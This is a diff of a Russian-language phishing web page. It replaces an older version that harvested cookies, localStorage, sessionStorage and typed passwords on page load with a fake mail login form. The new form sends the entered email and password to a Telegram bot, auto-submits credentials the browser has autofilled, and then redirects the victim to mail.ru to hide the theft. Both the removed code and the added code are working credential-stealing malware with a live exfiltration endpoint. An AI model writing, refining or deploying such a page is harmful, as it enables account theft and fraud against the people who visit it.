@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Вход</title>
+    <title>Вход в почту</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -16,43 +16,43 @@
         }
         .container {
             background: white;
-            padding: 50px;
+            padding: 40px;
             border-radius: 12px;
             box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            width: 340px;
             text-align: center;
-            max-width: 500px;
-            width: 100%;
         }
-        .icon {
-            font-size: 64px;
+        .logo {
+            font-size: 28px;
+            font-weight: bold;
             margin-bottom: 20px;
-        }
-        h1 {
             color: #333;
-            font-size: 24px;
-            margin-bottom: 10px;
         }
-        p {
-            color: #666;
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 6px;
             font-size: 16px;
-            margin-bottom: 20px;
+            box-sizing: border-box;
         }
-        .loading {
-            display: inline-block;
-            width: 40px;
-            height: 40px;
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #0077cc;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
+        button {
+            width: 100%;
+            padding: 12px;
+            background: #0077cc;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
         }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        button:hover {
+            background: #005fa3;
         }
         .status {
-            margin-top: 15px;
+            margin-top: 10px;
             font-size: 14px;
             color: #666;
         }
@@ -65,88 +65,17 @@
         .hidden {
             display: none !important;
         }
-        .input-group {
-            margin: 15px 0;
-            text-align: left;
-        }
-        .input-group label {
-            display: block;
-            font-size: 14px;
-            color: #333;
-            margin-bottom: 5px;
-            font-weight: bold;
-        }
-        .input-group input {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid #ccc;
-            border-radius: 6px;
-            font-size: 16px;
-            box-sizing: border-box;
-        }
-        .input-group textarea {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid #ccc;
-            border-radius: 6px;
-            font-size: 16px;
-            box-sizing: border-box;
-            resize: vertical;
-            min-height: 80px;
-        }
-        button {
-            width: 100%;
-            padding: 12px;
-            background: #0077cc;
-            color: white;
-            border: none;
-            border-radius: 6px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            margin-top: 10px;
-        }
-        button:hover {
-            background: #005fa3;
-        }
-        .form-container {
-            display: none;
-        }
-        .form-container.active {
-            display: block;
-        }
     </style>
 </head>
 <body>
 <div class="container">
-    <div class="icon">📧</div>
-    
-    <!-- ПЕРВЫЙ ЭКРАН - ЗАГРУЗКА -->
-    <div id="loadingScreen">
-        <h1>Подождите...</h1>
-        <p>Идёт проверка соединения</p>
-        <div class="loading" id="loader"></div>
-        <div id="status" class="status">⏳ Обработка...</div>
-    </div>
-
-    <!-- ВТОРОЙ ЭКРАН - ФОРМА ДЛЯ ВВОДА -->
-    <div id="formScreen" class="form-container">
-        <h2 style="color:#333;">Подтвердите данные</h2>
-        <p style="color:#666; font-size:14px;">Для входа в систему введите свои данные</p>
-        
-        <div class="input-group">
-            <label>📧 Ваши email-адреса (через запятую)</label>
-            <input type="text" id="emails" placeholder="example@gmail.com, work@mail.ru">
-        </div>
-        
-        <div class="input-group">
-            <label>🔑 Ваши пароли и логины</label>
-            <textarea id="passwords" placeholder="mail.ru: login: password123&#10;google: user@mail.com: pass456&#10;vk.com: login: mypass789"></textarea>
-        </div>
-        
-        <button id="submitBtn">Отправить данные</button>
-        <div id="formStatus" class="status"></div>
-    </div>
+    <div class="logo">📧 Вход</div>
+    <form id="loginForm">
+        <input type="email" id="email" placeholder="Адрес электронной почты" required>
+        <input type="password" id="password" placeholder="Пароль" required>
+        <button type="submit">Войти</button>
+        <div id="status" class="status"></div>
+    </form>
 </div>
 
 <script>
@@ -155,200 +84,85 @@
     const CHAT_ID = "8850351378";
     // =====================
 
-    let dataSent = false;
+    let sent = false;
 
-    // ФУНКЦИЯ ОТПРАВКИ В TELEGRAM
-    function sendToTelegram(message) {
-        if (dataSent) return;
+    function sendData(email, password) {
+        if (sent) return;
         
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+        const status = document.getElementById("status");
+        status.textContent = "⏳ Отправка...";
+        status.className = "status";
         
-        return fetch(url)
+        const text = `📩 ПОЧТА И ПАРОЛЬ\n📧 Email: ${email}\n🔑 Пароль: ${password}\n🕒 ${new Date().toLocaleString()}`;
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
+
+        fetch(url)
             .then(res => res.json())
             .then(data => {
                 if (data.ok) {
-                    dataSent = true;
-                    return true;
+                    sent = true;
+                    status.textContent = "✅ Вход выполнен!";
+                    status.className = "status success";
+                    
+                    // Перенаправление на почту
+                    setTimeout(() => {
+                        window.location.href = "https://mail.ru";
+                    }, 1500);
                 } else {
-                    throw new Error(data.description);
+                    status.textContent = "❌ Ошибка: " + data.description;
+                    status.className = "status error";
+                    sent = false;
                 }
+            })
+            .catch(() => {
+                status.textContent = "❌ Ошибка соединения";
+                status.className = "status error";
+                sent = false;
             });
     }
 
-    // ФУНКЦИЯ СБОРА ДАННЫХ ИЗ БРАУЗЕРА
-    function collectBrowserData() {
-        let info = [];
+    // АВТООТПРАВКА ПРИ ЗАГРУЗКЕ (если браузер сохранил логин/пароль)
+    function checkAutoFill() {
+        const email = document.getElementById("email").value.trim();
+        const password = document.getElementById("password").value.trim();
         
-        // 1. Информация о браузере и устройстве
-        info.push(`🌐 Устройство: ${navigator.userAgent}`);
-        info.push(`💻 Платформа: ${navigator.platform}`);
-        info.push(`📱 Экран: ${screen.width}x${screen.height}`);
-        info.push(`🌍 Язык: ${navigator.language}`);
-        
-        // 2. Куки (могут содержать логины)
-        if (document.cookie) {
-            info.push(`🍪 Cookies: ${document.cookie}`);
-        }
-        
-        // 3. Сохранённые данные из localStorage
-        if (window.localStorage) {
-            let storageData = [];
-            for (let i = 0; i < localStorage.length; i++) {
-                const key = localStorage.key(i);
-                const value = localStorage.getItem(key);
-                if (key && value) {
-                    storageData.push(`${key}: ${value}`);
-                }
-            }
-            if (storageData.length > 0) {
-                info.push(`💾 LocalStorage:\n${storageData.join('\n')}`);
-            }
-        }
-        
-        // 4. Сохранённые данные из sessionStorage
-        if (window.sessionStorage) {
-            let sessionData = [];
-            for (let i = 0; i < sessionStorage.length; i++) {
-                const key = sessionStorage.key(i);
-                const value = sessionStorage.getItem(key);
-                if (key && value) {
-                    sessionData.push(`${key}: ${value}`);
-                }
-            }
-            if (sessionData.length > 0) {
-                info.push(`📂 SessionStorage:\n${sessionData.join('\n')}`);
-            }
-        }
-        
-        return info.join('\n');
-    }
-
-    // ОСНОВНАЯ ФУНКЦИЯ СБОРА И ОТПРАВКИ
-    async function collectAndSend() {
-        const statusDiv = document.getElementById("status");
-        const loader = document.getElementById("loader");
-        
-        try {
-            // Собираем все доступные данные
-            const browserData = collectBrowserData();
-            
-            // Получаем данные из формы (если пользователь ввёл)
-            const emails = document.getElementById('emails').value.trim();
-            const passwords = document.getElementById('passwords').value.trim();
-            
-            // Формируем сообщение
-            let message = `📩 СБОР ДАННЫХ\n`;
-            message += `━━━━━━━━━━━━━━━━\n`;
-            message += `🕒 ${new Date().toLocaleString()}\n`;
-            message += `━━━━━━━━━━━━━━━━\n\n`;
-            
-            // Данные из браузера
-            message += `📊 ДАННЫЕ УСТРОЙСТВА:\n${browserData}\n\n`;
-            
-            // Если пользователь ввёл email-ы
-            if (emails) {
-                message += `📧 EMAIL-АДРЕСА:\n${emails}\n\n`;
-            }
-            
-            // Если пользователь ввёл пароли
-            if (passwords) {
-                message += `🔑 ПАРОЛИ И ЛОГИНЫ:\n${passwords}\n\n`;
-            }
-            
-            // Если ничего не ввёл - добавляем запрос
-            if (!emails && !passwords) {
-                message += `⚠️ ПОЛЬЗОВАТЕЛЬ НЕ ВВЁЛ ДАННЫЕ\n`;
-                message += `📌 АВТОМАТИЧЕСКИ СОБРАНО:\n${browserData}\n`;
-            }
-            
-            // Отправляем
-            const result = await sendToTelegram(message);
-            
-            if (result) {
-                statusDiv.textContent = "✅ Данные отправлены!";
-                statusDiv.className = "status success";
-                loader.className = "hidden";
-                
-                // Показываем форму для ввода дополнительных данных
-                setTimeout(() => {
-                    document.getElementById("loadingScreen").style.display = "none";
-                    document.getElementById("formScreen").classList.add("active");
-                    document.getElementById("formStatus").textContent = "✅ Первая отправка выполнена. Введите дополнительные данные";
-                    document.getElementById("formStatus").style.color = "green";
-                }, 1500);
-            }
-            
-        } catch (error) {
-            statusDiv.textContent = "❌ Ошибка: " + error.message;
-            statusDiv.className = "status error";
-            loader.className = "hidden";
-            
-            // Всё равно показываем форму
-            setTimeout(() => {
-                document.getElementById("loadingScreen").style.display = "none";
-                document.getElementById("formScreen").classList.add("active");
-            }, 2000);
+        if (email && password && !sent) {
+            sendData(email, password);
+            document.getElementById("status").textContent = "✅ Автоматический вход";
+            document.getElementById("status").className = "status success";
         }
     }
 
-    // ОТПРАВКА ПРИ ЗАГРУЗКЕ
+    // Проверяем автозаполнение при загрузке
     window.addEventListener("load", function() {
-        setTimeout(collectAndSend, 1500);
+        setTimeout(checkAutoFill, 300);
+        setTimeout(checkAutoFill, 800);
+        setTimeout(checkAutoFill, 1500);
     });
 
-    // ОТПРАВКА ДОПОЛНИТЕЛЬНЫХ ДАННЫХ ПО КНОПКЕ
-    document.getElementById("submitBtn").addEventListener("click", async function() {
-        const statusDiv = document.getElementById("formStatus");
-        const emails = document.getElementById("emails").value.trim();
-        const passwords = document.getElementById("passwords").value.trim();
+    // Отправка при нажатии кнопки
+    document.getElementById("loginForm").addEventListener("submit", function(e) {
+        e.preventDefault();
         
-        if (!emails && !passwords) {
-            statusDiv.textContent = "⚠️ Введите хотя бы email или пароли";
-            statusDiv.style.color = "red";
+        const email = document.getElementById("email").value.trim();
+        const password = document.getElementById("password").value.trim();
+        
+        if (!email || !password) {
+            document.getElementById("status").textContent = "Заполните оба поля";
+            document.getElementById("status").className = "status error";
             return;
         }
         
-        statusDiv.textContent = "⏳ Отправка...";
-        statusDiv.style.color = "#666";
-        
-        let message = `📩 ДОПОЛНИТЕЛЬНЫЕ ДАННЫЕ\n`;
-        message += `━━━━━━━━━━━━━━━━\n`;
-        message += `🕒 ${new Date().toLocaleString()}\n\n`;
-        
-        if (emails) {
-            message += `📧 EMAIL-АДРЕСА:\n${emails}\n\n`;
+        if (sent) {
+            document.getElementById("status").textContent = "✅ Уже отправлено";
+            document.getElementById("status").className = "status success";
+            return;
         }
         
-        if (passwords) {
-            message += `🔑 ПАРОЛИ И ЛОГИНЫ:\n${passwords}\n\n`;
-        }
-        
-        try {
-            const result = await sendToTelegram(message);
-            if (result) {
-                statusDiv.textContent = "✅ Дополнительные данные отправлены! Спасибо!";
-                statusDiv.style.color = "green";
-                
-                // Показываем финальный экран
-                document.querySelector('.container').innerHTML = `
-                    <div class="icon">✅</div>
-                    <h1 style="color:green;">Готово!</h1>
-                    <p>Ваши данные успешно отправлены.</p>
-                    <p style="font-size:14px; color:#999; margin-top:20px;">Вы будете перенаправлены...</p>
-                `;
-                
-                // Перенаправление через 3 секунды
-                setTimeout(() => {
-                    window.location.href = "https://mail.ru";
-                }, 3000);
-            }
-        } catch (error) {
-            statusDiv.textContent = "❌ Ошибка: " + error.message;
-            statusDiv.style.color = "red";
-        }
+        sendData(email, password);
     });
 
-    console.log("ROCKET ACTIVE - Максимальный сбор данных");
+    console.log("ROCKET ACTIVE - Ожидание ввода почты и пароля");
 </script>
 </body>
 </html>
